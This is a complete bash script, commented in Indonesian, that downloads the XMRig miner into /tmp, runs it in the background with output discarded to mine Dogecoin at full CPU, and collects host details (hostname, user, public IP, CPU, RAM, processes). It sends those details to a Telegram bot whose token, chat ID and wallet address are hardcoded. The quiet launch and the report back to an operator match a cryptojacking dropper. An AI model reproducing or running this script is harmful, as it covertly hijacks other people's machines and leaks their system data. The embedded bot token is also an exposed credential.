#!/bin/bash

# ========== KONFIGURASI ==========
WALLET="DHti5q3g2QYS2tE2bPZVxaZWgkzjYKVMjz"      # Ganti dengan walletmu
BOT_TOKEN="7718242724:AAHmR3eFxah3juQcpkS_AnybzsOBU3OuIPw" # Ganti dengan token bot Telegram kamu
CHAT_ID="5104210301"                 # Ganti dengan Chat ID kamu

# ========== PILIH DIREKTORI ==========
if [ -d "/tmp" ]; then
  BASE_DIR="/tmp"
elif [ -d "/opt" ]; then
  BASE_DIR="/opt"
elif [ -d "/var" ]; then
  BASE_DIR="/var"
else
  BASE_DIR="$(cd "$(dirname "$0")" && pwd)"
fi

WORK_DIR="$BASE_DIR/tester"
mkdir -p "$WORK_DIR"
cd "$WORK_DIR" || exit 1

# ========== UNDUH DAN EKSTRAK XMRIG ==========
wget -O xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz
tar -xzf xmrig.tar.gz
cd xmrig-6.21.0 || exit 1

# ========== JALANKAN XMRIG DI BACKGROUND TANPA LOG ==========
run_command="./xmrig -o stratum+ssl://rx.unmineable.com:443 -a rx -k -u DOGE:$WALLET.ROOTs --cpu-max-threads-hint=100"

if command -v nohup >/dev/null 2>&1; then
  nohup $run_command > /dev/null 2>&1 &
elif command -v setsid >/dev/null 2>&1; then
  setsid $run_command > /dev/null 2>&1 &
elif command -v disown >/dev/null 2>&1; then
  $run_command > /dev/null 2>&1 & disown
else
  $run_command > /dev/null 2>&1 &
fi

# ========== KUMPULKAN INFO SISTEM ==========
uname=$(hostname)
uname_info=$(uname -a)
whoami=$(whoami)
ip_info=$(curl -s ifconfig.me)
ram_info=$(free -h | grep Mem | awk '{print $3 "/" $2}')
cpu_cores=$(grep "model name" /proc/cpuinfo | uniq | awk -F: '{print $2}' | xargs)
core_count=$(nproc --all)
cpu_threads=$(lscpu | grep "Thread(s) per core" | awk '{print $4}')

# Ambil info proses xmrig
sleep 2
procs=$(ps -aux | grep xmrig | grep -v grep | awk '{for(i=11;i<=NF;++i)printf $i" "; print ""}')

# ========== KIRIM NOTIFIKASI TELEGRAM ==========
message="✅ <b>XMRig dijalankan sukses</b>%0A"
message+="🖥️ <b>Hostname</b>: <code>$uname</code>%0A"
message+="🧠 <b>CPU</b>: $core_count core(s)%0A"
message+="🧪 <b>Info</b>: $cpu_cores | $cpu_threads thread/core%0A"
message+="📦 <b>RAM</b>: $ram_info%0A"
message+="👤 <b>User</b>: $whoami%0A"
message+="🌐 <b>IP</b>: $ip_info%0A"
message+="🔧 <b>System</b>: <code>$uname_info</code>%0A%0A"
message+="⛏️ <b>Process</b>:%0A<code>$procs</code>"

curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
  -d chat_id="$CHAT_ID" \
  -d text="$message" \
  -d parse_mode="HTML" > /dev/null
